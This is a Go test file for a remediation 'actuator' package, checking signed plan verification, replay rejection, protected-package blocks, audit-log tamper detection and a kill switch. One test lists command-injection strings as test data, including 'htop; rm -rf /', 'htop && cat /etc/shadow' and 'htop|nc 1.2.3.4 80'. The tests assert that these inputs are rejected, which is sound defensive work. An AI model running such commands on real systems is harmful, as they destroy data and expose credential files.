// Copyright 2026 Kazeshini Authors
// SPDX-License-Identifier: Apache-2.0

package actuator_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/OWNER/kazeshini/internal/actuator"
)

func TestActuator_TamperedPlanRejected(t *testing.T) {
	pub, priv, err := actuator.GenerateApproverKeypair()
	if err != nil {
		t.Fatal(err)
	}

	plan := actuator.RemediationPlan{
		ID:           "plan-1",
		TargetHostID: "test-host-123",
		CreatedAt:    time.Now().UTC(),
		Steps: []actuator.ExecutionStep{
			{ID: "s1", Action: "package_install", Target: "htop"},
		},
	}

	env := &actuator.ExecutionEnvelope{
		EnvelopeVersion: "1.0",
		Plan:            plan,
		HostID:          "test-host-123",
		Nonce:           "nonce-1",
		Approver:        "admin@test",
		ApprovedAt:      time.Now().UTC(),
		ExpiresAt:       time.Now().UTC().Add(10 * time.Minute),
	}

	if err := actuator.SignEnvelope(env, priv); err != nil {
		t.Fatal(err)
	}

	// Tamper with plan content after signing
	env.Plan.Steps[0].Target = "malicious-pkg"

	err = actuator.VerifyEnvelope(env, pub, "test-host-123", time.Now().UTC())
	if err == nil {
		t.Fatal("expected tampered plan to be rejected, but verification succeeded")
	}
}

func TestActuator_ExpiredPlanRejected(t *testing.T) {
	pub, priv, err := actuator.GenerateApproverKeypair()
	if err != nil {
		t.Fatal(err)
	}

	plan := actuator.RemediationPlan{
		ID:           "plan-2",
		TargetHostID: "test-host-123",
		CreatedAt:    time.Now().UTC().Add(-30 * time.Minute),
		Steps: []actuator.ExecutionStep{
			{ID: "s1", Action: "package_upgrade", Target: "curl"},
		},
	}

	env := &actuator.ExecutionEnvelope{
		EnvelopeVersion: "1.0",
		Plan:            plan,
		HostID:          "test-host-123",
		Nonce:           "nonce-2",
		Approver:        "admin@test",
		ApprovedAt:      time.Now().UTC().Add(-30 * time.Minute),
		ExpiresAt:       time.Now().UTC().Add(-15 * time.Minute), // Already expired
	}

	if err := actuator.SignEnvelope(env, priv); err != nil {
		t.Fatal(err)
	}

	err = actuator.VerifyEnvelope(env, pub, "test-host-123", time.Now().UTC())
	if err == nil {
		t.Fatal("expected expired plan to be rejected, but it passed")
	}
}

func TestActuator_WrongHostRejected(t *testing.T) {
	pub, priv, err := actuator.GenerateApproverKeypair()
	if err != nil {
		t.Fatal(err)
	}

	plan := actuator.RemediationPlan{
		ID:           "plan-3",
		TargetHostID: "target-host-A",
		CreatedAt:    time.Now().UTC(),
		Steps: []actuator.ExecutionStep{
			{ID: "s1", Action: "package_upgrade", Target: "curl"},
		},
	}

	env := &actuator.ExecutionEnvelope{
		EnvelopeVersion: "1.0",
		Plan:            plan,
		HostID:          "target-host-A",
		Nonce:           "nonce-3",
		Approver:        "admin@test",
		ApprovedAt:      time.Now().UTC(),
		ExpiresAt:       time.Now().UTC().Add(10 * time.Minute),
	}

	if err := actuator.SignEnvelope(env, priv); err != nil {
		t.Fatal(err)
	}

	// Verify against machine with different host ID
	err = actuator.VerifyEnvelope(env, pub, "target-host-B", time.Now().UTC())
	if err == nil {
		t.Fatal("expected wrong host plan to be rejected, but it passed")
	}
}

func TestActuator_ReplayRejected(t *testing.T) {
	tmpDir := t.TempDir()
	noncePath := filepath.Join(tmpDir, "nonces.json")

	ns, err := actuator.NewNonceStore(noncePath, 1*time.Hour)
	if err != nil {
		t.Fatal(err)
	}

	now := time.Now().UTC()
	if err := ns.CheckAndRecord("nonce-unique-1", now); err != nil {
		t.Fatalf("first use of nonce should succeed: %v", err)
	}

	// Second use of same nonce must fail immediately
	if err := ns.CheckAndRecord("nonce-unique-1", now); err == nil {
		t.Fatal("replay of nonce should be rejected, but passed")
	}
}

func TestActuator_ProtectedPackageBlocked(t *testing.T) {
	protected := []string{"libc6", "systemd", "openssh-server", "apt", "dpkg"}
	for _, p := range protected {
		step := actuator.ExecutionStep{
			Action: "package_remove",
			Target: p,
		}
		_, err := actuator.BuildCommand(step, "apt", "")
		if err == nil {
			t.Errorf("expected removal of protected package %q to be blocked, but it was allowed", p)
		}
	}

	// Running kernel removal blocked
	stepKernel := actuator.ExecutionStep{
		Action: "package_remove",
		Target: "linux-image-6.8.0-40-generic",
	}
	_, err := actuator.BuildCommand(stepKernel, "apt", "6.8.0-40-generic")
	if err == nil {
		t.Error("expected removal of active kernel to be blocked, but it was allowed")
	}
}

func TestActuator_ArgvInjectionAttempts(t *testing.T) {
	injections := []string{
		"htop; rm -rf /",
		"-o ProxyCommand=evil",
		"htop && cat /etc/shadow",
		"htop|nc 1.2.3.4 80",
		"htop`whoami`",
		"htop$(id)",
		"../etc/passwd",
	}

	for _, inj := range injections {
		step := actuator.ExecutionStep{
			Action: "package_install",
			Target: inj,
		}
		_, err := actuator.BuildCommand(step, "apt", "")
		if err == nil {
			t.Errorf("expected command injection %q to be rejected, but it passed", inj)
		}
	}
}

func TestActuator_AuditChainTamperDetection(t *testing.T) {
	tmpDir := t.TempDir()
	auditPath := filepath.Join(tmpDir, "audit.log")

	al, err := actuator.NewAuditLogger(auditPath)
	if err != nil {
		t.Fatal(err)
	}

	for i := 1; i <= 3; i++ {
		err := al.LogStep(actuator.AuditRecord{
			Timestamp:  time.Now().UTC(),
			PlanID:     "plan-audit",
			PlanHash:   "hash",
			Approver:   "ops",
			Nonce:      fmt.Sprintf("n-%d", i),
			StepIndex:  i,
			Action:     "package_upgrade",
			Target:     "curl",
			Argv:       []string{"/usr/bin/apt-get", "install", "curl"},
			ExitCode:   0,
			DurationMs: 120,
			Status:     "SUCCEEDED",
		})
		if err != nil {
			t.Fatal(err)
		}
	}

	// Valid chain
	count, err := actuator.VerifyAuditChain(auditPath)
	if err != nil {
		t.Fatalf("clean audit chain should verify, got error: %v", err)
	}
	if count != 3 {
		t.Fatalf("expected 3 records, verified %d", count)
	}

	// Tamper with record 2 by modifying file bytes
	data, _ := os.ReadFile(auditPath)
	tampered := []byte(string(data) + `{"timestamp":"2026-01-01T00:00:00Z","plan_id":"fake","prev_hash":"corrupted","entry_hash":"bad"}` + "\n")
	_ = os.WriteFile(auditPath, tampered, 0600)

	_, err = actuator.VerifyAuditChain(auditPath)
	if err == nil {
		t.Fatal("tampered audit log was not detected by VerifyAuditChain")
	}
}

func TestActuator_KillSwitchStopsExecution(t *testing.T) {
	tmpDir := t.TempDir()
	sentinel := filepath.Join(tmpDir, "actuator.disabled")
	_ = os.WriteFile(sentinel, []byte("disabled"), 0644)

	cfg := actuator.Config{
		SentinelPath:  sentinel,
		CurrentHostID: "test-host",
	}
	eng := actuator.NewEngine(cfg, nil, nil)

	env := &actuator.ExecutionEnvelope{
		EnvelopeVersion: "1.0",
		Plan: actuator.RemediationPlan{
			ID:           "plan-kill",
			TargetHostID: "test-host",
			Steps: []actuator.ExecutionStep{
				{ID: "s1", Action: "package_upgrade", Target: "curl"},
			},
		},
		HostID: "test-host",
	}

	res, err := eng.ExecuteEnvelope(context.Background(), env, false)
	if err == nil {
		t.Fatal("expected execution with kill switch to fail")
	}
	if res.Status != actuator.StatusAborted {
		t.Errorf("expected status ABORTED, got %s", res.Status)
	}
}

func TestActuator_DryRunSimulatedExecution(t *testing.T) {
	pub, priv, err := actuator.GenerateApproverKeypair()
	if err != nil {
		t.Fatal(err)
	}

	tmpDir := t.TempDir()
	auditPath := filepath.Join(tmpDir, "audit.log")
	al, _ := actuator.NewAuditLogger(auditPath)

	cfg := actuator.Config{
		CurrentHostID:  "test-host",
		ApproverPubKey: pub,
		PackageManager: "apt",
	}
	eng := actuator.NewEngine(cfg, al, nil)

	plan := actuator.RemediationPlan{
		ID:           "plan-dryrun",
		TargetHostID: "test-host",
		CreatedAt:    time.Now().UTC(),
		Steps: []actuator.ExecutionStep{
			{ID: "s1", Action: "package_upgrade", Target: "sudo"},
		},
	}

	env := &actuator.ExecutionEnvelope{
		EnvelopeVersion: "1.0",
		Plan:            plan,
		HostID:          "test-host",
		Nonce:           "nonce-dryrun-1",
		Approver:        "admin@test",
		ApprovedAt:      time.Now().UTC(),
		ExpiresAt:       time.Now().UTC().Add(10 * time.Minute),
	}

	if err := actuator.SignEnvelope(env, priv); err != nil {
		t.Fatal(err)
	}

	res, err := eng.ExecuteEnvelope(context.Background(), env, false) // apply = false (dry-run)
	if err != nil {
		t.Fatalf("dry-run simulation failed: %v", err)
	}
	if res.Status != actuator.StatusSucceeded {
		t.Errorf("expected dry-run to succeed, got %s", res.Status)
	}
	if res.ExecutedSteps != 1 {
		t.Errorf("expected 1 executed step, got %d", res.ExecutedSteps)
	}
}
